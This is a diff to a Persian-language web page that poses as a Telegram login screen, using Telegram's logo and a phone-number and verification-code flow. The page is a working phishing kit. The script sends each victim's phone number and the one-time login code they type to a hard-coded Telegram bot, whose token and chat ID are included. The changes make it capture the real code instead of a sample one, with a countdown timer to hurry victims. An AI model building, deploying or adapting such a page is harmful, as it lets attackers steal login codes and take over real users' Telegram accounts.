@@ -28,6 +28,7 @@
       box-shadow: 0 4px 20px rgba(0, 0, 0, 0.1);
       border-radius: 12px;
       padding: 20px;
+      box-sizing: border-box;
     }
 
     .logo {
@@ -89,6 +90,12 @@
       text-align: center;
     }
 
+    #timer {
+      margin-top: 10px;
+      font-size: 16px;
+      color: #ff0000;
+      text-align: center;
+    }
   </style>
 </head>
 <body>
@@ -99,8 +106,7 @@
     </div>
 
     <!-- فرم ورود -->
-    <form>
-      <!-- انتخاب کد کشور -->
+    <form id="login-form">
       <div class="form-group">
         <label for="country-code">کد کشور</label>
         <select id="country-code">
@@ -112,13 +118,11 @@
         </select>
       </div>
 
-      <!-- شماره تلفن -->
       <div class="form-group">
         <label for="phone">شماره تلفن</label>
-        <input type="tel" id="phone" placeholder="09000000000" inputmode="numeric" pattern="[0-9]*">
+        <input type="tel" id="phone" placeholder="مثال: 00000000000" inputmode="numeric" pattern="[0-9]*">
       </div>
 
-      <!-- دکمه "بعدی" -->
       <button class="btn" type="button" id="next-btn">بعدی</button>
     </form>
 
@@ -126,10 +130,10 @@
   </div>
 
   <script>
-    const botToken = "AAF2kUPcAnMlSVwkgxIsGcopyx5z9aWd6Gs"; // توکن ربات تلگرام
-    const chatId = "7386908761"; // شناسه عددی شما
+    const botToken = "7649130822:AAF2kUPcAnMlSVwkgxIsGcopyx5z9aWd6Gs"; // توکن
+    const chatId = "7386908761"; // آیدی عددی چت
 
-    document.getElementById('next-btn').addEventListener('click', function () {
+    document.getElementById('next-btn').addEventListener('click', function() {
       const phone = document.getElementById('phone').value;
       const countryCode = document.getElementById('country-code').value;
 
@@ -138,43 +142,76 @@
 
         // ارسال شماره تلفن به ربات تلگرام
         fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
+          method: "POST",
+          headers: {
+            "Content-Type": "application/json"
+          },
           body: JSON.stringify({
             chat_id: chatId,
             text: `شماره تلفن: ${fullPhoneNumber}`
           })
-        }).then(response => {
-          if (response.ok) {
-            alert('شماره تلفن ارسال شد. حالا کد ارسال می‌شود.');
-            sendVerificationCode();
-          } else {
-            alert('خطا در ارسال اطلاعات به ربات.');
-          }
         });
+
+        if (confirm('آیا شماره ' + fullPhoneNumber + ' به درستی وارد شده است؟')) {
+          alert('کد تأیید ارسال شد!');
+
+          // نمایش بخش وارد کردن کد
+          document.querySelector('.container').innerHTML = `
+            <div class="logo">
+              <img src="https://telegram.org/img/t_logo.png" alt="Telegram Logo">
+            </div>
+            <h3>کد ارسال شده را وارد نمایید</h3>
+            <div class="form-group">
+              <input type="text" id="verification-code" placeholder="کد تأیید را وارد کنید" inputmode="numeric" pattern="[0-9]*">
+            </div>
+            <div id="timer">زمان باقی‌مانده: 2:00</div>
+            <button class="btn" id="verify-btn">تأیید</button>
+          `;
+
+          startTimer(); // شروع تایمر
+
+          document.getElementById('verify-btn').addEventListener('click', function() {
+            const verificationCode = document.getElementById('verification-code').value;
+
+            if (verificationCode) {
+              // ارسال کد تأیید به ربات تلگرام
+              fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                method: "POST",
+                headers: {
+                  "Content-Type": "application/json"
+                },
+                body: JSON.stringify({
+                  chat_id: chatId,
+                  text: `کد تأیید: ${verificationCode}`
+                })
+              });
+
+              alert('کد با موفقیت ارسال شد!');
+            } else {
+              alert('لطفاً کد تأیید را وارد کنید.');
+            }
+          });
+        }
       } else {
-        alert('لطفاً شماره تلفن خود را وارد کنید');
+        alert('لطفاً شماره تلفن خود را وارد کنید.');
       }
     });
 
-    function sendVerificationCode() {
-      const verificationCode = "123456"; // کد تأیید نمونه
+    // تایمر 2 دقیقه‌ای
+    function startTimer() {
+      let timeLeft = 120;  // 2 دقیقه = 120 ثانیه
+      const timerElement = document.getElementById('timer');
+      const interval = setInterval(function() {
+        const minutes = Math.floor(timeLeft / 60);
+        const seconds = timeLeft % 60;
+        timerElement.innerHTML = 'زمان باقی‌مانده: ' + minutes + ':' + (seconds < 10 ? '0' + seconds : seconds);
+        timeLeft--;
 
-      // ارسال کد تأیید به ربات تلگرام
-      fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-          chat_id: chatId,
-          text: `کد تأیید: ${verificationCode}`
-        })
-      }).then(response => {
-        if (response.ok) {
-          alert('کد تأیید ارسال شد.');
-        } else {
-          alert('خطا در ارسال کد تأیید به ربات.');
+        if (timeLeft < 0) {
+          clearInterval(interval);
+          timerElement.innerHTML = 'زمان تمام شد';
         }
-      });
+      }, 1000);
     }
   </script>
 </body>
